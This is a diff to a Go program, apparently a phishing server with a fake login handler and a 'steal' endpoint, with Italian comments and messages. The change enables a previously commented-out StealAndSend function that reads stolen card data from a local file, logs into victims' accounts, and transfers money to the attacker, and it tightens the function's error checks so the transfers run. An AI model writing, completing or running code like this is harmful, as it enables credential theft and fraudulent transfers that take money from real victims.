@@ -1,8 +1,10 @@
 package main
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"net/http"
 	"os"
@@ -60,7 +62,7 @@ func stealHandler(w http.ResponseWriter, r *http.Request) {
 	// Chiama la funzione StealAndSend() se necessario
 	log.Println("Dati rubati e salvati con successo")
 	fmt.Fprintln(w, "Dati rubati e salvati con successo")
-	//StealAndSend()
+	StealAndSend()
 }
 
 func fakeloginHandler(w http.ResponseWriter, r *http.Request) {
@@ -92,7 +94,6 @@ func fakeloginHandler(w http.ResponseWriter, r *http.Request) {
 	w.WriteHeader(http.StatusOK)
 }
 
-/*
 func StealAndSend() {
 	// Leggi i dati della carta dal file
 	file, err := os.Open("stolen.txt")
@@ -144,7 +145,7 @@ func StealAndSend() {
 	bodyBytes, _ := io.ReadAll(resp.Body)
 	log.Printf("Status login: %d, Body: %s\n", resp.StatusCode, string(bodyBytes))
 
-	if err != nil || resp.StatusCode != 200 {
+	if resp.StatusCode != 200 {
 		fmt.Println("Login fallito per", username)
 		return
 	}
@@ -199,6 +200,11 @@ func StealAndSend() {
 		fmt.Println("Errore invio soldi:", err)
 		return
 	}
-	sendResp.Body.Close()
-	fmt.Println("Soldi trasferiti da", username)
-}*/
+	defer sendResp.Body.Close()
+
+	if sendResp.StatusCode != 200 {
+		fmt.Println("Errore trasferimento soldi")
+		return
+	}
+	fmt.Println("Soldi trasferiti da", username, "all'attaccante")
+}
